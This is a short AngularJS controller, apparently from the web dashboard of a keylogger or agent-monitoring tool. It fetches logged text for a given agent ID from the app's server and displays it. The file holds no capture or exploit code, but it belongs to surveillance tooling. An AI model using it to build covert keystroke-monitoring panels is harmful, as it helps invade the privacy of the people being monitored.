app.controller('keyloggerReportController', function ($scope, $rootScope, $http, $routeParams, $window) {

  var url = window.location.origin + '/data/' + $routeParams.agentId + '/text'

  $http.get(url).then(function (response) {
    $scope.logs = response.data
  }).catch(function (err) {
    console.log(err)
  })

  $scope.openInNewWindow = function(url){
    $window.open(url);
  }
})
